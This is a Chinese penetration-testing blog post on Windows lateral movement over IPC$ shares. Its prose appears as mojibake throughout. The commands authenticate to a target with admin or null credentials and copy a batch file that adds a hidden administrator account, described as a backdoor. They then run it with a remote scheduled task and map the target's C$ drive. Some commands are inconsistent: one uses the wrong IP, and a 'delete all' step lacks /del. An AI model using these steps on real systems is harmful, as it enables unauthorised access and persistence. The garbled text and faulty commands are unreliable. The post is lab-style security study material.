<!DOCTYPE html><html lang="zh-cn"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>PenTest Vol.6 - å†…ç½‘ | IPC éƒ¨åˆ† - Naykcin's Page</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/logo.png"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com"><span>Github</span></a></li><li><a href="https://www.v2ex.com/"><span>V2EX</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="http://47.95.140.43/typora_pic/background.JPG"><div class="post-title"><h1 class="title">PenTest Vol.6 - å†…ç½‘ | IPC éƒ¨åˆ†</h1><ul class="meta"><li><i class="icon icon-author"></i>Naykcin</li><li><i class="icon icon-clock"></i>9 Minutes</li><li><i class="icon icon-calendar"></i>September 2, 2019</li></ul></div></div><div class="article-content" style="max-width:800px"><h2 id="PenTest-Vol-6-å†…ç½‘-IPC-éƒ¨åˆ†"><a href="#PenTest-Vol-6-å†…ç½‘-IPC-éƒ¨åˆ†" class="headerlink" title="PenTest Vol.6 - å†…ç½‘ | IPC éƒ¨åˆ†"></a><center>PenTest Vol.6 - å†…ç½‘ | IPC éƒ¨åˆ†</center></h2><h3 id="ğŸ“-IPC"><a href="#ğŸ“-IPC" class="headerlink" title="ğŸ“ IPC"></a>ğŸ“ IPC</h3><p>ğŸŒ IPCï¼ŒInternet Process Connectionï¼Œæ˜¯å…±äº«â€œå‘½åâ€ç®¡é“çš„èµ„æºï¼Œå®ƒæ˜¯ä¸ºäº†è®©è¿›ç¨‹é—´ç›¸äº’é€šä¿¡è€Œå¼€æ”¾çš„å‘½åç®¡é“ï¼Œå¯ä»¥é€šè¿‡éªŒè¯ç”¨æˆ·åå’Œå¯†ç è·å¾—ç›¸åº”çš„æƒé™ï¼Œåœ¨è¿œç¨‹ç®¡ç†è®¡ç®—æœºå’ŒæŸ¥çœ‹è®¡ç®—æœºçš„å…±äº«èµ„æºæ—¶ä½¿ç”¨ã€‚</p>
<p>IPC å¸¸ç”¨çš„é€šä¿¡æ–¹å¼æœ‰ï¼š</p>
<ul>
<li>ç®¡é“ï¼ˆåŒ…æ‹¬<strong>åŒ¿åç®¡é“</strong>å’Œ<strong>å‘½åç®¡é“</strong>ï¼‰ï¼šåŒ¿åç®¡é“åªèƒ½åœ¨æœ¬æœºä¸Šçš„çˆ¶å­è¿›ç¨‹ä¹‹é—´é€šä¿¡ï¼Œè€Œå‘½åç®¡é“ä¸ä»…å¯ä»¥åœ¨æœ¬æœºä¸Šå®ç°ä¸¤ä¸ªè¿›ç¨‹é—´çš„é€šä¿¡ï¼Œè¿˜å¯ä»¥è·¨ç½‘ç»œå®ç°ä¸¤ä¸ªè¿›ç¨‹é—´çš„é€šä¿¡ã€‚</li>
<li>æ¶ˆæ¯é˜Ÿåˆ—</li>
<li>ä¿¡å·é‡</li>
<li>å…±äº«å­˜å‚¨</li>
<li>socket</li>
<li>streams</li>
<li>â€¦</li>
</ul>
<p>å…¶ä¸­ Socket å’Œ Streams æ”¯æŒä¸åŒä¸»æœºä¸Šçš„ä¸¤ä¸ªè¿›ç¨‹ IPCã€‚</p>
<h3 id="ğŸ“-å¼€å¯æœåŠ¡"><a href="#ğŸ“-å¼€å¯æœåŠ¡" class="headerlink" title="ğŸ“ å¼€å¯æœåŠ¡"></a>ğŸ“ å¼€å¯æœåŠ¡</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// è¿˜æ²¡æœ‰ææ¸…æ¥šå¼€å¯è¿™ä¸¤ä¸ªæœåŠ¡çš„ç›®çš„ </span><br><span class="line">// [å·²è§£å†³]è¿™é‡Œæ˜¯ä¸ºäº†å¼€å¯å®šæ—¶æœåŠ¡ç­‰ï¼Œæ–¹ä¾¿åé¢atè¿è¡Œå®šæ—¶ä»»åŠ¡</span><br><span class="line">c:\&gt;net start Schedule</span><br><span class="line"></span><br><span class="line">c:\&gt;net start wmiApSrv</span><br><span class="line"></span><br><span class="line">// è®°å¾—å…³é—­é˜²ç«å¢™</span><br></pre></td></tr></table></figure>

<h3 id="ğŸ“-å»ºç«‹-IPC"><a href="#ğŸ“-å»ºç«‹-IPC" class="headerlink" title="ğŸ“ å»ºç«‹ IPC"></a>ğŸ“ å»ºç«‹ IPC</h3><p>æ”»å‡»è€…ï¼š172.16.232.209</p>
<p>ç›®æ ‡ä¸»æœºï¼š172.16.97.129</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt;net use \\192.16.97.129\ipc$ /user:administrator &quot;123456&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>å¦‚æœæŠ¥é”™ 53:æ‰¾ä¸åˆ°ç½‘ç»œè·¯å¾„ï¼Œè¯´æ˜ç›®æ ‡ä¸»æœºå¼€å¯äº†é˜²ç«å¢™ã€‚</p>
</li>
<li><p>å¦‚æœæŠ¥é”™ 1219:ä¸å…è®¸ä¸€ä¸ªç”¨æˆ·ä½¿ç”¨ä¸€ä¸ªä»¥ä¸Šç”¨æˆ·åä¸æœåŠ¡å™¨æˆ–å…±äº«èµ„æºçš„å¤šé‡è¿æ¥ï¼Œè¯´æ˜å·²ç»è¿æ¥è¿‡ï¼Œåˆ å»å†è¿æ¥å³å¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// åˆ é™¤æŸä¸ªipc</span><br><span class="line">c:\&gt;net use \\172.16.97.129\ipc$ /del</span><br><span class="line"></span><br><span class="line">// åˆ é™¤å…¨éƒ¨ipcè¿æ¥</span><br><span class="line">c:\&gt;net use * /del /y</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>å¯ä»¥åˆ©ç”¨ IPC ç©ºè¿æ¥æ¥æµ‹è¯•å¯¹æ–¹æ˜¯å¦å¼€å¯äº† IPC é»˜è®¤å…±äº«æœåŠ¡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// å¦‚æœè¿æ¥æˆåŠŸè¯´æ˜å¯¹æ–¹ä¸»æœºå¼€å¯äº†è¿œç¨‹ IPC</span><br><span class="line">c:\&gt;net use \\172.16.97.129\\ipc$ /user:&quot;&quot; &quot;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="ğŸ“-åˆ©ç”¨-IPC-ä¼ æ–‡ä»¶"><a href="#ğŸ“-åˆ©ç”¨-IPC-ä¼ æ–‡ä»¶" class="headerlink" title="ğŸ“ åˆ©ç”¨ IPC ä¼ æ–‡ä»¶"></a>ğŸ“ åˆ©ç”¨ IPC ä¼ æ–‡ä»¶</h3><p>å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–¹å¼æ¥ç•™åé—¨ã€‚æ”»å‡»è€…é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ‰¹å¤„ç†æ–‡ä»¶ useradd.batï¼Œå†…å®¹ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// æ–°å»ºç”¨æˆ·å¹¶åŠ å…¥ç®¡ç†å‘˜ç»„</span><br><span class="line">c:\&gt;net user test 123123 /add</span><br><span class="line">c:\&gt;net localgroup administrators test /add</span><br></pre></td></tr></table></figure>

<p>ç„¶åï¼Œåˆ©ç”¨ IPC å°†æ­¤æ‰¹å¤„ç†æ–‡ä»¶ä¼ é€è‡³ç›®æ ‡ä¸»æœºï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt;copy .\useradd.bat \\172.16.97.129\c$</span><br></pre></td></tr></table></figure>

<h3 id="ğŸ“-åˆ©ç”¨-IPC-æŸ¥çœ‹ç›®æ ‡ä¸»æœºç³»ç»Ÿæ—¶é—´"><a href="#ğŸ“-åˆ©ç”¨-IPC-æŸ¥çœ‹ç›®æ ‡ä¸»æœºç³»ç»Ÿæ—¶é—´" class="headerlink" title="ğŸ“ åˆ©ç”¨ IPC æŸ¥çœ‹ç›®æ ‡ä¸»æœºç³»ç»Ÿæ—¶é—´"></a>ğŸ“ åˆ©ç”¨ IPC æŸ¥çœ‹ç›®æ ‡ä¸»æœºç³»ç»Ÿæ—¶é—´</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt;net time \\172.16.97.129</span><br></pre></td></tr></table></figure>

<h3 id="ğŸ“-è¿è¡Œè®¡åˆ’ä»»åŠ¡"><a href="#ğŸ“-è¿è¡Œè®¡åˆ’ä»»åŠ¡" class="headerlink" title="ğŸ“ è¿è¡Œè®¡åˆ’ä»»åŠ¡"></a>ğŸ“ è¿è¡Œè®¡åˆ’ä»»åŠ¡</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt;at \\172.16.97.129 19:45 c:\useradd.bat</span><br></pre></td></tr></table></figure>

<h3 id="ğŸ“-ç¡®è®¤æ˜¯å¦å¯åŠ¨"><a href="#ğŸ“-ç¡®è®¤æ˜¯å¦å¯åŠ¨" class="headerlink" title="ğŸ“ ç¡®è®¤æ˜¯å¦å¯åŠ¨"></a>ğŸ“ ç¡®è®¤æ˜¯å¦å¯åŠ¨</h3><p>è¯¥ç¨‹åºä¼šé™é»˜è¿è¡Œï¼Œåªèƒ½åœ¨ä»»åŠ¡ç®¡ç†å™¨é‡Œçœ‹åˆ°ã€‚</p>
<h3 id="ğŸ“-æ˜ å°„ç›®æ ‡ä¸»æœºæŸä¸ªç›˜ç¬¦åˆ°æœ¬åœ°"><a href="#ğŸ“-æ˜ å°„ç›®æ ‡ä¸»æœºæŸä¸ªç›˜ç¬¦åˆ°æœ¬åœ°" class="headerlink" title="ğŸ“ æ˜ å°„ç›®æ ‡ä¸»æœºæŸä¸ªç›˜ç¬¦åˆ°æœ¬åœ°"></a>ğŸ“ æ˜ å°„ç›®æ ‡ä¸»æœºæŸä¸ªç›˜ç¬¦åˆ°æœ¬åœ°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// è¿™é‡Œæ˜ å°„çš„æ˜¯cç›˜ï¼Œè¦æ³¨æ„ç©ºæ ¼ã€‚</span><br><span class="line">c:\&gt;net use Z: \\172.16.97.129\c$</span><br></pre></td></tr></table></figure>

<h3 id="ğŸ“-æ–­å¼€-IPC-è¿æ¥"><a href="#ğŸ“-æ–­å¼€-IPC-è¿æ¥" class="headerlink" title="ğŸ“ æ–­å¼€ IPC è¿æ¥"></a>ğŸ“ æ–­å¼€ IPC è¿æ¥</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// æŸ¥çœ‹å½“å‰éƒ½æœ‰å“ªäº›è¿æ¥</span><br><span class="line">c:\&gt;net use</span><br><span class="line"></span><br><span class="line">// åˆ é™¤ç‰¹å®šçš„è¿æ¥</span><br><span class="line">c:\&gt;net use \\172.16.97.129 /del</span><br><span class="line"></span><br><span class="line">// åˆ é™¤å…¨éƒ¨è¿æ¥</span><br><span class="line">c:\&gt;net use</span><br></pre></td></tr></table></figure>

<h3 id="ğŸ“-å…³é—­-IPC"><a href="#ğŸ“-å…³é—­-IPC" class="headerlink" title="ğŸ“ å…³é—­ IPC"></a>ğŸ“ å…³é—­ IPC</h3><p>å—å®³è€…ä¸»æœºæ“ä½œï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// æŸ¥çœ‹å½“å‰çš„å…±äº«</span><br><span class="line">c:\&gt;net share</span><br><span class="line"></span><br><span class="line">// åˆ é™¤IPC$</span><br><span class="line">c:\&gt;net share ipc$ /del</span><br></pre></td></tr></table></figure>

<h3 id="ğŸ“-å¸¸ç”¨å‘½ä»¤"><a href="#ğŸ“-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="ğŸ“ å¸¸ç”¨å‘½ä»¤"></a>ğŸ“ å¸¸ç”¨å‘½ä»¤</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// æŸ¥çœ‹ç›®æ ‡ä¸»æœºå…±äº«çš„èµ„æº</span><br><span class="line">c:\&gt;net view \\172.16.97.129</span><br><span class="line"></span><br><span class="line">// æŸ¥çœ‹ç›®æ ‡ä¸»æœºçš„NETBIOSç”¨æˆ·ï¼ˆè‡ªå·±æœ¬æœºä¹Ÿéœ€è¦å¼€å¯ï¼‰</span><br><span class="line">c:\&gt;nbtstat -A 172.16.97.129</span><br><span class="line"></span><br><span class="line">// æ–‡ä»¶ä¸Šä¼ ä¸ä¸‹è½½</span><br><span class="line">c:\&gt;copy .\test.txt \\172.16.97.129\c$\windows\temp\test.txt</span><br><span class="line"></span><br><span class="line">c:\&gt;copy \\172.16.97.129\c$\test.txt c:\</span><br></pre></td></tr></table></figure>

<h3 id="ğŸ“-å¸¸è§é”™è¯¯åˆ†æï¼š"><a href="#ğŸ“-å¸¸è§é”™è¯¯åˆ†æï¼š" class="headerlink" title="ğŸ“ å¸¸è§é”™è¯¯åˆ†æï¼š"></a>ğŸ“ å¸¸è§é”™è¯¯åˆ†æï¼š</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">é”™è¯¯å· 5ï¼Œæ‹’ç»è®¿é—®ï¼šå¯èƒ½æ˜¯ä½¿ç”¨çš„ç”¨æˆ·ä¸æ˜¯ç®¡ç†å‘˜æƒé™ï¼Œéœ€è¦å…ˆææƒï¼›</span><br><span class="line">é”™è¯¯å· 51ï¼ŒWindows æ— æ³•æ‰¾åˆ°ç½‘ç»œè·¯å¾„ï¼šç½‘ç»œæœ‰é—®é¢˜ï¼›</span><br><span class="line">é”™è¯¯å· 53ï¼Œæ‰¾ä¸åˆ°ç½‘ç»œè·¯å¾„ï¼šIP åœ°å€é”™è¯¯ï¼›ç›®æ ‡æœªå¼€æœºï¼›ç›®æ ‡ manlanserver æœåŠ¡æœªå¯åŠ¨ï¼›ç›®æ ‡ä¸»æœºå¼€å¯äº†é˜²ç«å¢™ï¼›</span><br><span class="line">é”™è¯¯å· 67ï¼Œæ‰¾ä¸åˆ°ç½‘ç»œåï¼šä½ çš„ lanmanworkstation æœåŠ¡æœªå¯åŠ¨ï¼Œæˆ–è€…ç›®æ ‡åˆ é™¤äº†ipc$ï¼›</span><br><span class="line">é”™è¯¯å· 1219ï¼Œæä¾›çš„å‡­æ®ä¸å·²å­˜åœ¨çš„å‡­æ®é›†å†²çªï¼šå·²ç»å’Œå¯¹æ–¹å»ºç«‹äº† ipc$ è¿æ¥ï¼Œéœ€è¦åˆ é™¤å†é‡è¿ï¼›</span><br><span class="line">é”™è¯¯å· 1326ï¼ŒæœªçŸ¥çš„ç”¨æˆ·åæˆ–é”™è¯¯å¯†ç ï¼›</span><br><span class="line">é”™è¯¯å· 1792ï¼Œè¯•å›¾ç™»å½•ï¼Œä½†æ˜¯ç½‘ç»œç™»å½•æœåŠ¡æ²¡æœ‰å¯åŠ¨ï¼šç›®æ ‡ netlogon æœåŠ¡æœªå¯åŠ¨ï¼›</span><br><span class="line">é”™è¯¯å· 2242ï¼Œæ­¤ç”¨æˆ·çš„å¯†ç å·²ç»è¿‡æœŸï¼šç›®æ ‡æœ‰è´¦å·ç­–ç•¥ï¼Œå¼ºåˆ¶å®šæœŸè¦æ±‚æ›´æ”¹å¯†ç ã€‚</span><br></pre></td></tr></table></figure>

</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ck71hm2xj000e48ozld6asv7p" data-title="PenTest Vol.6 - å†…ç½‘ | IPC éƒ¨åˆ†" data-url="http://www.naykcin.top/2019/09/02/å†…ç½‘æ¸—é€IPC/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
var duoshuoQuery = {short_name: siteName};
(function() {
  var ds = document.createElement('script');
  ds.type = 'text/javascript';ds.async = true;
  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
  ds.charset = 'UTF-8';
  (document.getElementsByTagName('head')[0] 
  || document.getElementsByTagName('body')[0]).appendChild(ds);
})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2019/10/03/emergency0/"><i class="icon icon-arror-left"></i></a></li><li><a href="/2019/08/07/æ¸—é€æµ‹è¯•å§¿åŠ¿-ç™»å½•é¡µé¢/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="http://47.95.140.43/tu/721580653348_.pic.jpg" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">Â© 2020 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
window.onload = function () {
  wrap.className += ' done';
}</script></body></html>